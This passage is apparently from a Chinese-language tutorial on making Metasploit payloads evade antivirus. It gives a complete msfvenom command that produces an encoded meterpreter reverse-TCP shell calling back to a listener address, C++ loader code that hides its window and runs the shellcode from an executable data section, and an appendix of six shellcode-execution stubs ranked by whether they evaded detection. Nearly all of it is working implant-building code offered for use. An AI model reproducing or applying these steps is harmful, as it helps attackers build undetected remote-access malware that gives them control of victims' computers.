PART 2  /免杀步骤


  • 通过msfvenom 生成c 语言格式的shellcode


msfvenom-a x86 --platform Windows -e x86/shikata_ga_nai -pwindows/meterpreter/reverse_tcp LHOST=192.168.124.132 LPORT=4444 -f  c > shellcode_encoder.c

参数说明：

-a 指定处理器架构，x86即可

--platform 指定运行的平台，这里就选windows了

-e 指定编码方式，shikata_ga_nai 是被评价为excellent 级别的编码方式

-p 指定使用的payload，这里选tcp 反向连接

-f  指定输出文件格式

LHOST 指定靶机回连地址，即运行metasploit 的主机地址

LPORT 指定靶机回连对应端口，即运行metasploit 的主机监听端口

  • 通过visual studio 创建hello world 程序（语言选c++即可）

  • 用下面的代码替换vs 自动帮你生成的hello world 代码

#include "windows.h"#include "stdio.h"
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口#pragma comment(linker, "/section:.data,RWE")    // 如果要使用汇编代码来调用，需要开启此参数
unsigned char shellcode[] ="这里是你上面生成的shellcode";
int main(){   __asm  {    mov eax, offset shellcode;    _emit 0xFF;    _emit 0xE0;  }  return 0;}

其中需要注意这行代码（因为使用了内联汇编形式调用shellcode，所以需要增加此参数）

#pragma comment(linker, "/section:.data,RWE")

附录

经测试，能够运行 shellcode 的加载代码有很多种，但是免杀的只发现两种

  • 免杀01

  __asm  {    mov eax, offset shellcode;    _emit 0xFF;    _emit 0xE0;  }

  • 免杀02

__asm  {    lea eax, shellcode;    jmp eax;  }

  • 不免杀03

__asm  {    lea eax, shellcode    call eax  }

  • 不免杀04

__asm  {    mov eax, offset shellcode;    jmp eax;  }

  • 不免杀05

((void(*)(void)) & shellcode)();

  • 不免杀06（这种方式不需要打开数据段读写执行即可）

LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  memcpy(Memory, shellcode, sizeof(shellcode));  ((void(*)())Memory)();
